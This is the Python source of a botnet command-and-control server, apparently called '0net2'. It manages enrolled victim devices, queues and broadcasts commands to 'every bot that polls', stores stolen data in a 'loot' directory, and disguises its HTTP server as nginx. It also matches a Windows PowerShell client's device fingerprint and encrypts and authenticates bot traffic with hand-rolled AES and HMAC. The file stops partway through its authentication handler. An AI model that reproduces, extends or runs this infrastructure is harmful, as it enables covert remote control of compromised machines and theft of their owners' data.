#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import re
import json
import hmac
import time
import base64
import shutil
import atexit
import hashlib
import secrets
import string
import threading
import socketserver
import http.server
import ipaddress
import collections
from datetime import datetime

try:
    import readline  # line editing + history
    readline.set_history_length(2000)
except Exception:
    pass

try:
    import termios
except Exception:
    termios = None

# --- tty ---

_TTY_ATTR = None

def _save_tty():
    global _TTY_ATTR
    if termios is None:
        return
    try:
        if sys.stdin is not None and sys.stdin.isatty():
            _TTY_ATTR = termios.tcgetattr(sys.stdin.fileno())
    except Exception:
        _TTY_ATTR = None

def restore_tty():
    global _TTY_ATTR
    if termios is None or _TTY_ATTR is None:
        return
    a = _TTY_ATTR
    _TTY_ATTR = None
    try:
        termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, a)
    except Exception:
        pass

atexit.register(restore_tty)

# --- palette ---

class C:
    R = RESET = "\033[0m"
    B = BOLD = "\033[1m"
    D = DIM = "\033[2m"
    RED = "\033[31m"
    GRN = GREEN = "\033[32m"
    YEL = YELLOW = "\033[33m"
    BLU = BLUE = "\033[34m"
    MAG = MAGENTA = "\033[35m"
    CYN = CYAN = "\033[36m"
    WHT = WHITE = "\033[37m"
    BGREEN = "\033[92m"; BRED = "\033[91m"; BYELLOW = "\033[93m"
    BBLUE = "\033[94m"; BMAGENTA = "\033[95m"; BCYAN = "\033[96m"; BWHITE = "\033[97m"

if not sys.stdout.isatty():
    for _k in ("R", "B", "D", "RED", "GRN", "YEL", "BLU", "MAG", "CYN", "WHT",
               "RESET", "BOLD", "DIM", "GREEN", "YELLOW", "WHITE", "BLUE",
               "MAGENTA", "CYAN", "BGREEN", "BRED", "BYELLOW", "BBLUE",
               "BMAGENTA", "BCYAN", "BWHITE"):
        setattr(C, _k, "")

_ANSI = re.compile(r'\x1b\[[0-9;?]*[A-Za-z]')

def clean(s):
    return _ANSI.sub('', s).replace('\r', '')

def vis_len(s):
    return len(_ANSI.sub('', s))

def get_width():
    try:
        w = shutil.get_terminal_size((80, 24)).columns
    except Exception:
        w = 80
    return max(min(w - 4, 68), 44)

def panel_top(title=""):
    w = get_width()
    if title:
        head = "─ " + title + " "
        pad = w - 2 - vis_len(head)
        if pad < 0:
            head = head[:w - 2]; pad = 0
        return C.BCYAN + "╭" + head + ("─" * pad) + "╮" + C.RESET
    return C.BCYAN + "╭" + ("─" * (w - 2)) + "╮" + C.RESET

def panel_bottom():
    w = get_width()
    return C.BCYAN + "╰" + ("─" * (w - 2)) + "╯" + C.RESET

def panel_divider(label=""):
    w = get_width()
    if label:
        head = "─ " + label + " "
        pad = w - 2 - vis_len(head)
        return C.BCYAN + "├" + head + ("─" * max(0, pad)) + "┤" + C.RESET
    return C.BCYAN + "├" + ("─" * (w - 2)) + "┤" + C.RESET

def panel_line(content=""):
    w = get_width()
    inner = w - 4
    if vis_len(content) > inner:
        content = _ANSI.sub('', content)[:inner]
    pad = max(0, inner - vis_len(content))
    return C.BCYAN + "│" + C.RESET + "  " + content + (" " * pad) + C.BCYAN + "│" + C.RESET

def panel_blank():
    w = get_width()
    return C.BCYAN + "│" + C.RESET + (" " * (w - 2)) + C.BCYAN + "│" + C.RESET

def panel_center(plain, styled):
    w = get_width()
    inner = w - 2
    if len(plain) >= inner:
        return C.BCYAN + "│" + C.RESET + plain[:inner] + C.BCYAN + "│" + C.RESET
    tp = inner - len(plain)
    l = tp // 2; r = tp - l
    return C.BCYAN + "│" + C.RESET + (" " * l) + styled + (" " * r) + C.BCYAN + "│" + C.RESET

def tag(label, color=None):
    return (color or C.BCYAN) + "[" + label + "]" + C.RESET

_PRINT = threading.Lock()

def say(sym, colour, msg):
    with _PRINT:
        print(f" {colour}{sym}{C.RESET} {msg}", flush=True)

def ago(ts):
    d = max(0, int(time.time() - ts))
    if d < 60: return f"{d}s ago"
    if d < 3600: return f"{d // 60}m ago"
    return f"{d // 3600}h ago"

# --- aes-128-cbc (pure stdlib) ---

class AES:
    _GF_CACHE = {}

    def __init__(self, key):
        if len(key) != 16:
            raise ValueError("Key must be 16 bytes")
        self.key = key
        self.Nb = 4
        self.Nk = 4
        self.Nr = 10
        self.sbox = [
            0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
            0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
            0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
            0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
            0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
            0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
            0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
            0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
            0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
            0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
            0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
            0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
            0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
            0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
            0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
            0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16,
        ]
        self.inv_sbox = [0] * 256
        for i, v in enumerate(self.sbox):
            self.inv_sbox[v] = i
        self.Rcon = [0x01000000, 0x02000000, 0x04000000, 0x08000000, 0x10000000,
                     0x20000000, 0x40000000, 0x80000000, 0x1b000000, 0x36000000]
        self.w = self._key_expansion(key)

    def _sub_word(self, word):
        return (self.sbox[(word >> 24) & 0xFF] << 24 | self.sbox[(word >> 16) & 0xFF] << 16 |
                self.sbox[(word >> 8) & 0xFF] << 8 | self.sbox[word & 0xFF])

    def _rot_word(self, word):
        return ((word << 8) & 0xFFFFFFFF) | (word >> 24)

    def _key_expansion(self, key):
        key_bytes = list(key)
        w = [0] * (4 * (self.Nr + 1))
        for i in range(self.Nk):
            w[i] = (key_bytes[4 * i] << 24) | (key_bytes[4 * i + 1] << 16) | \
                   (key_bytes[4 * i + 2] << 8) | key_bytes[4 * i + 3]
        for i in range(self.Nk, 4 * (self.Nr + 1)):
            temp = w[i - 1]
            if i % self.Nk == 0:
                temp = self._sub_word(self._rot_word(temp)) ^ self.Rcon[i // self.Nk - 1]
            w[i] = w[i - self.Nk] ^ temp
        return w

    def _add_round_key(self, state, rnd):
        for i in range(4):
            for j in range(4):
                state[i][j] ^= (self.w[rnd * 4 + j] >> (24 - 8 * i)) & 0xFF

    def _sub_bytes(self, state):
        for i in range(4):
            for j in range(4):
                state[i][j] = self.sbox[state[i][j]]

    def _inv_sub_bytes(self, state):
        for i in range(4):
            for j in range(4):
                state[i][j] = self.inv_sbox[state[i][j]]

    def _shift_rows(self, state):
        state[1][0], state[1][1], state[1][2], state[1][3] = state[1][1], state[1][2], state[1][3], state[1][0]
        state[2][0], state[2][1], state[2][2], state[2][3] = state[2][2], state[2][3], state[2][0], state[2][1]
        state[3][0], state[3][1], state[3][2], state[3][3] = state[3][3], state[3][0], state[3][1], state[3][2]

    def _inv_shift_rows(self, state):
        state[1][0], state[1][1], state[1][2], state[1][3] = state[1][3], state[1][0], state[1][1], state[1][2]
        state[2][0], state[2][1], state[2][2], state[2][3] = state[2][2], state[2][3], state[2][0], state[2][1]
        state[3][0], state[3][1], state[3][2], state[3][3] = state[3][1], state[3][2], state[3][3], state[3][0]

    def _mix_columns(self, state):
        for j in range(4):
            a = [state[i][j] for i in range(4)]
            state[0][j] = self._gf256_mul(0x02, a[0]) ^ self._gf256_mul(0x03, a[1]) ^ a[2] ^ a[3]
            state[1][j] = a[0] ^ self._gf256_mul(0x02, a[1]) ^ self._gf256_mul(0x03, a[2]) ^ a[3]
            state[2][j] = a[0] ^ a[1] ^ self._gf256_mul(0x02, a[2]) ^ self._gf256_mul(0x03, a[3])
            state[3][j] = self._gf256_mul(0x03, a[0]) ^ a[1] ^ a[2] ^ self._gf256_mul(0x02, a[3])

    def _inv_mix_columns(self, state):
        for j in range(4):
            a = [state[i][j] for i in range(4)]
            state[0][j] = (self._gf256_mul(0x0e, a[0]) ^ self._gf256_mul(0x0b, a[1]) ^
                           self._gf256_mul(0x0d, a[2]) ^ self._gf256_mul(0x09, a[3]))
            state[1][j] = (self._gf256_mul(0x09, a[0]) ^ self._gf256_mul(0x0e, a[1]) ^
                           self._gf256_mul(0x0b, a[2]) ^ self._gf256_mul(0x0d, a[3]))
            state[2][j] = (self._gf256_mul(0x0d, a[0]) ^ self._gf256_mul(0x09, a[1]) ^
                           self._gf256_mul(0x0e, a[2]) ^ self._gf256_mul(0x0b, a[3]))
            state[3][j] = (self._gf256_mul(0x0b, a[0]) ^ self._gf256_mul(0x0d, a[1]) ^
                           self._gf256_mul(0x09, a[2]) ^ self._gf256_mul(0x0e, a[3]))

    @staticmethod
    def _gf256_mul(a, b):
        k = (a << 8) | b
        v = AES._GF_CACHE.get(k)
        if v is not None:
            return v
        p = 0
        for _ in range(8):
            if b & 1:
                p ^= a
            carry = a & 0x80
            a = (a << 1) & 0xFF
            if carry:
                a ^= 0x1B
            b >>= 1
        AES._GF_CACHE[k] = p
        return p

    def _bytes_to_state(self, data):
        return [[data[4 * j + i] for j in range(4)] for i in range(4)]

    def _state_to_bytes(self, state):
        return bytes(state[i][j] for j in range(4) for i in range(4))

    def _encrypt_block(self, plain):
        state = self._bytes_to_state(plain)
        self._add_round_key(state, 0)
        for rnd in range(1, self.Nr):
            self._sub_bytes(state)
            self._shift_rows(state)
            self._mix_columns(state)
            self._add_round_key(state, rnd)
        self._sub_bytes(state)
        self._shift_rows(state)
        self._add_round_key(state, self.Nr)
        return self._state_to_bytes(state)

    def _decrypt_block(self, cipher):
        state = self._bytes_to_state(cipher)
        self._add_round_key(state, self.Nr)
        for rnd in range(self.Nr - 1, 0, -1):
            self._inv_shift_rows(state)
            self._inv_sub_bytes(state)
            self._add_round_key(state, rnd)
            self._inv_mix_columns(state)
        self._inv_shift_rows(state)
        self._inv_sub_bytes(state)
        self._add_round_key(state, 0)
        return self._state_to_bytes(state)

    def encrypt_cbc(self, plaintext, iv):
        if isinstance(plaintext, str):
            plaintext = plaintext.encode()
        if len(plaintext) % 16:
            raise ValueError("plaintext not block aligned")
        ct = b""
        prev = iv
        for i in range(0, len(plaintext), 16):
            block = plaintext[i:i + 16]
            xored = bytes(a ^ b for a, b in zip(block, prev))
            enc = self._encrypt_block(xored)
            ct += enc
            prev = enc
        return ct

    def decrypt_cbc(self, ciphertext, iv):
        if len(ciphertext) % 16:
            raise ValueError("ciphertext not block aligned")
        pt = b""
        prev = iv
        for i in range(0, len(ciphertext), 16):
            block = ciphertext[i:i + 16]
            dec = self._decrypt_block(block)
            pt += bytes(a ^ b for a, b in zip(dec, prev))
            prev = block
        return pt

_AES_CACHE = {}
_AES_LOCK = threading.Lock()

def _aes(key):
    with _AES_LOCK:
        a = _AES_CACHE.get(key)
        if a is None:
            if len(_AES_CACHE) > 64:
                _AES_CACHE.clear()
            a = AES(key)
            _AES_CACHE[key] = a
        return a

# --- hkdf-sha256 ---

HKDF_SALT = b"0net2-v8"

def hkdf(ikm: bytes, info: bytes, length: int = 32) -> bytes:
    prk = hmac.new(HKDF_SALT, ikm, hashlib.sha256).digest()
    t = hmac.new(prk, info + b"\x01", hashlib.sha256).digest()
    return t[:length]

_KDF_CACHE = {}

def _derived(secret: str, info: bytes, length: int) -> bytes:
    k = (secret, info)
    v = _KDF_CACHE.get(k)
    if v is not None:
        return v
    v = hkdf(secret.encode(), info, length)
    if len(_KDF_CACHE) > 512:
        _KDF_CACHE.clear()
    _KDF_CACHE[k] = v
    return v

def kdf_aes(secret: str) -> bytes:
    return _derived(secret, b"aes", 16)

def kdf_mac(secret: str) -> bytes:
    return _derived(secret, b"mac", 32)

def kdf_auth(secret: str) -> bytes:
    return _derived(secret, b"auth", 32)

# --- crypto ---

def aes_encrypt(plaintext: str, secret: str) -> str:
    if not secret:
        return ""
    data = plaintext.encode("utf-8")
    pad = 16 - (len(data) % 16)
    data += bytes([pad]) * pad
    iv = os.urandom(16)
    return (iv + _aes(kdf_aes(secret)).encrypt_cbc(data, iv)).hex()

def aes_decrypt(cipher_hex: str, secret: str):
    if not cipher_hex or not secret:
        return None
    try:
        raw = bytes.fromhex(cipher_hex)
    except Exception:
        return None
    if len(raw) < 32 or len(raw) % 16:
        return None
    iv, ct = raw[:16], raw[16:]
    try:
        pt = _aes(kdf_aes(secret)).decrypt_cbc(ct, iv)
    except Exception:
        return None
    n = pt[-1]
    if 1 <= n <= 16 and len(pt) >= n and pt[-n:] == bytes([n]) * n:
        pt = pt[:-n]
    try:
        return pt.decode("utf-8")
    except Exception:
        return None

def mac_hex(data: str, secret: str) -> str:
    return hmac.new(kdf_mac(secret), data.encode("utf-8"), hashlib.sha256).hexdigest()

def auth_token(ts: str, nonce: str, secret: str) -> str:
    return hmac.new(kdf_auth(secret), f"{ts}:{nonce}".encode(), hashlib.sha256).hexdigest()

# --- config ---

SERVER_ENCRYPTION_KEY_STR = ""   # must match $KeyStr in the client
OLD_ENCRYPTION_KEY_STR = ""

SERVER_PORT = 3000
SERVER_BIND_ADDRESS = "127.0.0.1"
TRUST_PROXY_HEADERS = True
ORIGIN_TOKEN = ""

ONLINE_WINDOW = 30.0
PENDING_TTL = 120.0
NONCE_TTL = 30 * 24 * 3600.0
NONCE_PRUNE_SEC = 30.0
NONCE_MAX = 1_500_000
SKEW_WARN_MS = 300 * 1000
MAX_BODY = 16 * 1024 * 1024
MAX_CONN = 256
HANDLER_TIMEOUT = 20
RATE_LIMIT = 400
GLOBAL_RATE = 4000
KEY_GRACE_SEC = 1800.0
SHELL_TIMEOUT = 60.0
STATE_MIN_WRITE_SEC = 2.0
STALE_SWEEP_SEC = 2.0
UPLOAD_STALE_SEC = 3600.0
MAX_NAME_LEN = 120
MAX_PRINT_LINES = 400
MAX_PRINT_CHARS = 60000
MAX_LOG_BYTES = 2 * 1024 * 1024
MAX_SECRETS = 8

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
STATE_FILE = os.path.join(BASE_DIR, "0net2_state.json")
REPORT_DIR = os.path.join(BASE_DIR, "reports")
LOOT_DIR = os.path.join(BASE_DIR, "loot")
UPLOAD_DIR = os.path.join(BASE_DIR, "_uploads")
for _d in (REPORT_DIR, LOOT_DIR, UPLOAD_DIR):
    os.makedirs(_d, exist_ok=True)

DID_RE = re.compile(r'^[A-F0-9]{6}$')

# --- globals ---

clients = {}          # did -> {"ip","ts","os"}
ip_to_ids = {}        # ip -> set(did)
clients_lock = threading.Lock()

enrolled = {}         # did -> [secret, ...] (persisted)
enrolled_ip = {}      # did -> last authed address (persisted)
enrolled_lock = threading.Lock()

pending = {}          # key (did | ip | "*") -> deque of {"id","text","ts"}
delivered = {}        # did -> set(cmd_id)
pending_lock = threading.Lock()

pending_events = {}   # did -> {cmd_id: Event}
blocked_ids = set()
blocked_ips = set()
block_lock = threading.Lock()

poll_hint = {}        # did | ip | "*" -> requested poll interval

nonces = collections.OrderedDict()
nonce_lock = threading.Lock()
_nonce_prune = 0.0

rate = {}
g_rate = [0.0, 0]
rate_lock = threading.Lock()

_save_lock = threading.Lock()
_last_save = 0.0

_upload_sweep = 0.0
_stale_sweep = 0.0

broadcast_timer = None
broadcast_enc = ""
broadcast_mac = ""
broadcast_text = ""

# --- state ---

def load_state():
    global enrolled, enrolled_ip, blocked_ids, blocked_ips, OLD_ENCRYPTION_KEY_STR
    try:
        with open(STATE_FILE, "r", encoding="utf-8") as f:
            s = json.load(f)
        e = {}
        for k, v in s.get("enrolled", {}).items():
            if not DID_RE.match(k):
                continue
            if isinstance(v, str):
                v = [v] if v else []
            v = [x for x in v if isinstance(x, str) and x][-MAX_SECRETS:]
            if v:
                e[k] = v
        enrolled = e
        ip = {}
        for k, v in s.get("enrolled_ip", {}).items():
            if k in e and isinstance(v, str):
                ip[k] = v
        enrolled_ip = ip
        blocked_ids = set(s.get("blocked_ids", []))
        blocked_ips = set(s.get("blocked_ips", []))
        ok = s.get("old_key", "")
        if isinstance(ok, str) and ok:
            OLD_ENCRYPTION_KEY_STR = ok
    except Exception:
        pass

def _write_state():
    try:
        with enrolled_lock:
            e = {k: list(v) for k, v in enrolled.items()}
            ei = {k: v for k, v in enrolled_ip.items() if k in enrolled}
        with block_lock:
            bi = sorted(blocked_ids)
            bp = sorted(blocked_ips)
        tmp = STATE_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump({"enrolled": e, "enrolled_ip": ei,
                       "blocked_ids": bi, "blocked_ips": bp,
                       "old_key": OLD_ENCRYPTION_KEY_STR}, f, indent=1)
        os.replace(tmp, STATE_FILE)
    except Exception as ex:
        say("!", C.YEL, f"state save failed: {ex}")

def save_state(force=False):
    global _last_save
    now = time.time()
    with _save_lock:
        if not force and now - _last_save < STATE_MIN_WRITE_SEC:
            return
        _last_save = now
    _write_state()

# --- helpers ---

def new_id():
    return ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(6))

def is_ip(t):
    try:
        ipaddress.ip_address(t)
        return True
    except Exception:
        return False

def norm_target(t):
    t = t.strip()
    if is_ip(t):
        return t
    return t.upper()

def check_nonce(n):
    global _nonce_prune
    if not n:
        return False
    now = time.time()
    with nonce_lock:
        if now - _nonce_prune > NONCE_PRUNE_SEC:
            _nonce_prune = now
            cut = now - NONCE_TTL
            while nonces:
                k, v = next(iter(nonces.items()))
                if v > cut:
                    break
                nonces.popitem(last=False)
        if n in nonces:
            return False
        nonces[n] = now
        while len(nonces) > NONCE_MAX:
            nonces.popitem(last=False)
        return True

def token_matches(ts, nonce, token, secret):
    if not ts or not token or not nonce:
        return False
    return hmac.compare_digest(token, auth_token(ts, nonce, secret))

def verify_mac(data, sig, keys):
    if not sig:
        return False
    for k in keys:
        if k and hmac.compare_digest(sig, mac_hex(data, k)):
            return True
    return False

def decrypt_payload(hex_data, key):
    return aes_decrypt(hex_data, key)

def _valid_ip(t):
    try:
        return str(ipaddress.ip_address(t.strip()))
    except Exception:
        return None

def _is_proxy_peer(ip):
    try:
        a = ipaddress.ip_address(ip)
    except Exception:
        return False
    return a.is_loopback or a.is_private or a.is_link_local

def get_client_ip(handler):
    peer = handler.client_address[0]
    if not (TRUST_PROXY_HEADERS and _is_proxy_peer(peer)):
        return peer
    # CF-Connecting-IP is set by the edge, caller can't forge it. X-Forwarded-For
    # is appended to by cloudflared so the right-most hop is what it saw.
    v = _valid_ip(handler.headers.get("CF-Connecting-IP", ""))
    if v:
        return v
    xff = handler.headers.get("X-Forwarded-For")
    if xff:
        for cand in reversed(xff.split(",")):
            v = _valid_ip(cand)
            if v:
                return v
    v = _valid_ip(handler.headers.get("X-Real-IP", ""))
    if v:
        return v
    return peer

def read_body(handler):
    try:
        n = int(handler.headers.get("Content-Length", 0))
    except Exception:
        n = 0
    if n < 0 or n > MAX_BODY:
        handler._send(413)
        return None
    if n == 0:
        return ""
    return handler.rfile.read(n).decode("ascii", errors="ignore")

def safe_ip(ip):
    return ip.replace(":", "-").replace("%", "_")

def rate_ok(ip):
    now = time.time()
    with rate_lock:
        if now - g_rate[0] >= 1.0:
            g_rate[0] = now
            g_rate[1] = 1
        else:
            g_rate[1] += 1
            if g_rate[1] > GLOBAL_RATE:
                return False
        w = rate.get(ip)
        if w is None or now - w[0] >= 1.0:
            rate[ip] = [now, 1]
            if len(rate) > 5000:
                for k in [k for k, v in list(rate.items()) if now - v[0] > 5]:
                    rate.pop(k, None)
            return True
        w[1] += 1
        return w[1] <= RATE_LIMIT

# --- fingerprint ---
# same canonical string as Get-DeviceId() in the client, byte for byte:
#   WIN_<ver><ARCH>[SERVER]_<BROWSER>SCR<w>x<h>_PLAT<plat>_MID<mid>
# (ARCH and SCR take no leading underscore, _CHROME/_PLAT/_MID do.)

WIN_RE = re.compile(r'Windows NT (\d+.\d+)(?:.\d+)?')
MAC_RE = re.compile(r'Mac OS X (\d+[.]\d+(?:[.]\d+)?)')
ANDROID_RE = re.compile(r'Android (\d+.\d+(?:.\d+)?)')
IOS_RE = re.compile(r'iPhone OS (\d+[\d]+)')
SCREEN_RE = re.compile(r'SCR:(\d+)x(\d+)')
MID_RE = re.compile(r'MID:([0-9A-Fa-f]{6,16})')
PLATFORM_RE = re.compile(r'PLAT:([A-Za-z0-9.-]{1,24})')

def generate_device_fingerprint_id(ua):
    detailed = ""

    m = WIN_RE.search(ua)
    if m:
        detailed = "WIN_" + m.group(1)
        if "Win64; x64" in ua: detailed += "X64"
        elif "WOW64" in ua: detailed += "WOW64"
        elif "ARM64" in ua: detailed += "ARM64"
        if "Windows NT 10.0" in ua and "Server" in ua:
            detailed += "SERVER"
    elif (m := MAC_RE.search(ua)):
        detailed = "MACOS" + m.group(1)
        if "Intel" in ua: detailed += "_INTEL"
        elif "Apple Silicon" in ua: detailed += "_APPLE"
    elif "Linux" in ua:
        detailed = "LINUX"
        if "x86_64" in ua: detailed += "_X64"
        elif "i686" in ua: detailed += "_X86"
        elif "aarch64" in ua: detailed += "_ARM64"
        elif "armv7l" in ua: detailed += "_ARM32"
        if "Ubuntu" in ua: detailed += "_UBUNTU"
        elif "Debian" in ua: detailed += "DEBIAN"
        elif "Fedora" in ua: detailed += "FEDORA"
    elif (m := ANDROID_RE.search(ua)):
        detailed = "ANDROID" + m.group(1)
        if "SM-" in ua: detailed += "SAMSUNG"
        elif "Pixel" in ua: detailed += "PIXEL"
    elif (m := IOS_RE.search(ua)):
        detailed = "IOS" + m.group(1)
        if "iPhone" in ua: detailed += "_IPHONE"
        elif "iPad" in ua: detailed += "_IPAD"
    else:
        detailed = "UNKNOWN_OS"

    if "Chrome" in ua:    detailed += "_CHROME"
    elif "Firefox" in ua: detailed += "_FIREFOX"
    elif "Safari" in ua:  detailed += "_SAFARI"
    elif "Edge" in ua:    detailed += "_EDGE"

    m = SCREEN_RE.search(ua)
    if m:
        detailed += "SCR" + m.group(1) + "x" + m.group(2)

    m = PLATFORM_RE.search(ua)
    if m:
        detailed += "_PLAT" + m.group(1)
    m = MID_RE.search(ua)
    if m:
        detailed += "_MID" + m.group(1).upper()

    return hashlib.sha256(detailed.encode()).hexdigest()[:6].upper()

def parse_os_from_user_agent(ua):
    u = ua.lower()
    for probe, label in (
        ("windows nt 10.0", "Windows 10/11"), ("windows nt 6.3", "Windows 8.1"),
        ("windows nt 6.2", "Windows 8"), ("windows nt 6.1", "Windows 7"),
        ("windows nt 6.0", "Windows Vista"), ("windows nt 5.1", "Windows XP"),
        ("windows", "Windows"), ("mac os x", "macOS"),
        ("android", "Android"), ("iphone", "iOS (iPhone)"), ("ipad", "iOS (iPad)"),
        ("freebsd", "FreeBSD"), ("openbsd", "OpenBSD"), ("netbsd", "NetBSD"),
        ("sunos", "Solaris"), ("solaris", "Solaris"), ("aix", "AIX"),
    ):
        if probe in u:
            return label
    if "linux" in u:
        return "Linux"
    return "Unknown OS"

# --- registry ---

def remove_stale_ips():
    now = time.time()
    any_hint = poll_hint.get("*", 0)
    gone = []
    with clients_lock:
        for did in list(clients.keys()):
            v = clients[did]
            win = ONLINE_WINDOW
            h = max(any_hint, poll_hint.get(did, 0), poll_hint.get(v["ip"], 0))
            if h:
                win = max(win, h * 3.0)
            if now - v["ts"] <= win:
                continue
            ip = v["ip"]
            del clients[did]
            s = ip_to_ids.get(ip)
            if s:
                s.discard(did)
                if not s:
                    del ip_to_ids[ip]
            gone.append(did)
    if gone:
        with pending_lock:
            for d in gone:
                delivered.pop(d, None)
    return gone

def sweep_stale():
    global _stale_sweep
    now = time.time()
    if now - _stale_sweep < STALE_SWEEP_SEC:
        return
    _stale_sweep = now
    remove_stale_ips()

def touch_client(did, ip, osinfo):
    with clients_lock:
        is_new = did not in clients
        old = clients.get(did)
        old_ip = old["ip"] if old else None
        clients[did] = {"ip": ip, "ts": time.time(), "os": osinfo}
        if old_ip and old_ip != ip:
            s = ip_to_ids.get(old_ip)
            if s:
                s.discard(did)
                if not s:
                    del ip_to_ids[old_ip]
        ip_to_ids.setdefault(ip, set()).add(did)
        return is_new

def note_ip(did, ip):
    if not did:
        return
    with enrolled_lock:
        if not enrolled.get(did) or enrolled_ip.get(did) == ip:
            return
        enrolled_ip[did] = ip
    save_state()

def block_client(target):
    removed = []
    target = norm_target(target)
    with block_lock, clients_lock:
        if is_ip(target):
            for did in list(ip_to_ids.get(target, [])):
                if did in clients:
                    c = clients.pop(did)
                    removed.append((c["ip"], did))
            ip_to_ids.pop(target, None)
            blocked_ips.add(target)
        else:
            c = clients.pop(target, None)
            if c:
                removed.append((c["ip"], target))
                s = ip_to_ids.get(c["ip"])
                if s:
                    s.discard(target)
                    if not s:
                        del ip_to_ids[c["ip"]]
            blocked_ids.add(target)
    return removed

# --- outbox ---

def enqueue(key, text, cid=None):
    cid = cid or new_id()
    cmd = {"id": cid, "text": f"{text} (ID-{cid})", "ts": time.time()}
    with pending_lock:
        pending.setdefault(key, collections.deque(maxlen=512)).append(cmd)
    return cid

def enqueue_all(text, cid=None):
    return enqueue("*", text, cid)

def take_pending(did, ip):
    # entries are peeked, not popped - the "*" queue is shared by the whole
    # fleet, so popping would only ever reach the first bot that polls
    now = time.time()
    with pending_lock:
        seen = delivered.setdefault(did, set())
        for key in (did, ip, "*"):
            q = pending.get(key)
            if not q:
                continue
            while q and now - q[0]["ts"] > PENDING_TTL:
                q.popleft()
            for c in q:
                if c["id"] in seen:
                    continue
                seen.add(c["id"])
                if len(seen) > 512:
                    seen.clear()
                    seen.add(c["id"])
                return c["text"]
        if len(pending) > 512:
            for k in [k for k, v in list(pending.items()) if not v]:
                pending.pop(k, None)
        return ""

# --- broadcast / key rotation ---

def _clear_broadcast():
    global broadcast_text, broadcast_enc, broadcast_mac, broadcast_timer
    broadcast_text = ""
    broadcast_enc = ""
    broadcast_mac = ""
    broadcast_timer = None

def set_broadcast(cmd, enc="", sig="", ttl=PENDING_TTL):
    global broadcast_text, broadcast_enc, broadcast_mac, broadcast_timer
    broadcast_text = cmd
    broadcast_enc = enc
    broadcast_mac = sig
    if broadcast_timer:
        broadcast_timer.cancel()
    broadcast_timer = threading.Timer(ttl, _clear_broadcast)
    broadcast_timer.daemon = True
    broadcast_timer.start()

# --- http ---

class RequestHandler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    timeout = HANDLER_TIMEOUT
    server_version = "nginx"
    sys_version = ""

    def version_string(self):
        return "nginx"

    def log_message(self, fmt, *args):
        pass

    def _send(self, code, body=b"", extra=None):
        try:
            self.send_response(code)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Connection", "close")
            for k, v in (extra or {}).items():
                self.send_header(k, v)
            self.end_headers()
            if body:
                self.wfile.write(body)
        except Exception:
            pass

    def _secrets(self, did):
        with enrolled_lock:
            return list(enrolled.get(did, ()))

    def _ip_ok(self, did, ip):
        with enrolled_lock:
            last = enrolled_ip.get(did, "")
        return (not last) or last == ip

    def _mint(self, did):
        # only for a device with no secret yet
        if not did or not DID_RE.match(did):
            return None
        with enrolled_lock:
            if enrolled.get(did):
                return None
            s = secrets.token_hex(16)
            enrolled[did] = [s]
            enrolled_ip[did] = ""
        save_state()
        say("+", C.GRN, f"enrolled {C.B}{did}{C.R}")
        return s

    def _auth(self):
        self.key_mode = ""
        self.key_str = ""
        self.did = ""

        ts = self.headers.get("X-Timestamp")
        token = self.headers.get("X-Auth-Token")
        nonce = self.headers.get("X-Nonce")
        ip = get_client_ip(self)
        if not ts or not token or not nonce:
            self._send(401)
            say("!", C.YEL, f"401 {self.path} missing auth headers from {ip}")
            return False

        if ORIGIN_TOKEN and self.headers.get("X-Origin-Token", "") != ORIGIN_TOKEN:
            self._send(403)
            say("!", C.YEL, f"403 {self.path} bad origin token")
            return False

        did = (self.headers.get("X-Client-ID") or "").upper()
